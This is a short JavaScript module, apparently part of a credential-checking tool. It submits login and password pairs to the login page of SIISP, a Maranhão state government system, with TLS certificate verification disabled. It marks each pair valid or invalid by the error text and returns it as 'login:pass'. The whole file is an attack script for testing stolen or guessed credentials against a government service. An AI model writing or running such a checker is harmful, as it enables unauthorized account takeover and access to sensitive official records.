import axios from "axios";
import https from 'https'
import request from '../core/configs.js'

export default async function sispMa(login, pass) {

  const url = 'https://siisp.ma.gov.br/SIISP/login'

  const dataRequest = `form=form&cpf=${login}&senha=${pass}&btLogin=&javax.faces.ViewState=6802859281405610391%3A3418087214680836867`;

  const { data } = await axios({
    method: "POST",
    headers: request.headers,
    data: dataRequest,
    url: url,
    validateStatus: () => true,
    httpsAgent: new https.Agent({  
        rejectUnauthorized: false 
      }),

  });

  
  if (data.includes("Usuário ou senha inválido."))
    return {
      success: false,
      login: login + ":" + pass,
      uri: url,
    };
  return {
    success: true,
    login: login + ":" + pass,
    uri: url,
  };
}

